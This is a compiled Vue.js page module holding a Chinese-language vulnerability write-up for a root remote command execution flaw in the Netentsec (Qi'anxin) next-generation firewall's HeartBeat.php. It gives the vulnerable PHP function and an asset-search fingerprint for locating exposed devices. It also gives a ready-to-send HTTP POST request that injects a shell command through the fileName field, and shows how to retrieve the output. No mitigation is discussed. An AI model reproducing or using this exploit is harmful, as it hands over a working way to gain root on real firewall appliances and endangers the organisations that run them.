import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as t}from"./app-58e4a7d6.js";const n={},d=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>网康 下一代防火墙 HeartBeat.php文件存在远程命令执行漏洞，攻击者通过构造请求包即可获取服务器Root权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>奇安信 网康下一代防火墙
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;网康科技-下一代防火墙&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085835290.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件 applications/Models/NS/Rpc/HeartBeat.php</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085853048.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function delTestFile($fileName){
	    if(dirname($fileName) == &#39;/var/www/tmp&#39;){
		$cmd = &quot;/bin/rm -f {$fileName}&quot;;
		putenv(&quot;CMD=$cmd&quot;);
		$msg = shell_exec(&#39;/var/www/html/scripts/exec_cmd&#39;);
	    }
	    return time();
	}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>调用方法 delTestFile，fileName参数可控，调用的 exec_cmd 文件为Root权限文件，构造请求包进行命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /directdata/direct/router HTTP/1.1
Host: 
Connection: close
Content-Length: 179
Cache-Control: max-age=0
sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;89&quot;, &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

{&quot;action&quot;:&quot;NS_Rpc_HeartBeat&quot;,&quot;method&quot;:&quot;delTestFile&quot;,&quot;data&quot;: [&quot;/var/www/tmp/1.txt;id&gt;2.txt&quot;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:11,&quot;f8839p7rqtj&quot;:&quot;=&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085915971.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>访问写入的文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230314085928381.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),l=[d];function s(o,r){return i(),a("div",null,l)}const m=e(n,[["render",s],["__file","网康 下一代防火墙 HeartBeat.php 远程命令执行漏洞.html.vue"]]);export{m as default};
